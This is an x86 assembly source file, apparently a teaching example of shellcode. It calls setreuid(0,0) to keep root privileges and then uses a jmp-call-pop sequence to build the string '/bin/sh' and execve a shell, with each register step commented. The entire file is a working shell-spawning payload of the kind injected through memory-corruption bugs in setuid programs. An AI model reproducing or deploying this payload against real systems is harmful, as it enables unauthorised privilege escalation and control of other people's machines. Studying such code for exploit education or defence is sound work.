.section .data
.globl _start

_start:
	## 	Name 		eax 	ebx 		ecx			edx			esi
	#70	sys_setreuid16	0x46	old_uid_t ruid	old_uid_t euid
	#11	sys_execve	0x0b	char __user *	char __user *__user *	char __user *__user *	struct pt_regs *

	nop
	
	#70(Decimal) = 0x46(hexadecimal)
	xor %eax, %eax	# zeroes eax register
	movb $70, %al # 70 -> syscall for sys_setreuid16
	
	xor %ebx, %ebx # zeroes ebx register, ruid(real userid)
	xor %ecx, %ecx # zeroes ecx register, euid(effective userid)
	
	int $0x80

	jmp do_call

jmp_back:
	#   execve("/bin/sh", *"/bin/sh", (char **)NULL);
	pop %ebx # ebx has the address of our string, use it to index
		
	xor %eax, %eax # zeroes eax register
	movb %al, 7(%ebx) # puts a null(0) at N aka shell[7]
	movl %ebx, 8(%ebx) # puts the address of our string at XXXX shell[8]	
	movl %eax, 12(%ebx) # puts a null(0) at YYYY shell[12]

	# /bin/sh\0(*ebx)(*0000)
	xor %eax, %eax # zeroes eax register
	movb $11, %al # execve syscall number
	leal 8(%ebx), %ecx # puts the address of XXXX aka (*ebx) into ecx
	leal 12(%ebx), %edx # puts the address of YYYY aka (*0000) into edx
	int $0x80 # call kernel

do_call:
	call jmp_back
shell:
	.ascii "/bin/shNXXXXYYYY"
